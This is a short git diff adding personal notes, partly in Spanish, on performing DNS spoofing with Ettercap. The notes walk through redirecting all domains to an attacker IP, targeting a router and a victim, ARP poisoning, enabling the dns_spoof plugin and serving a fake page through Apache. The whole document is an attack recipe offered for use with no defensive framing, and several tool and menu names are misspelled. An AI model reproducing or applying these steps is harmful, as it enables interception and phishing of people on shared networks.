@@ -1,0 +1,13 @@
+How To Use Ettercap - DNS Spoofing 
+
+1. leafpad /etc/etterccap/etter.dns
+2. comentareo las que estan en microsoft suck y agrego * 192.168.2.102 #ip atacante
+3. ettercap -G -> selecciono unifer snigffer ->  seleciono red 
+4. hots -> host list -> scanner for host
+5. seleciono tag1 con la ip del router
+6. selecciono tag2 con la ip de la victima 
+7. tagger -> current tagger
+8. mitm -> arp spoffin -> check sniffer remote
+9. pluging -> manager de plugin  -> dns_spoof
+10. edito el archivo index /var/www/html/index.html
+11. service apache2 start 
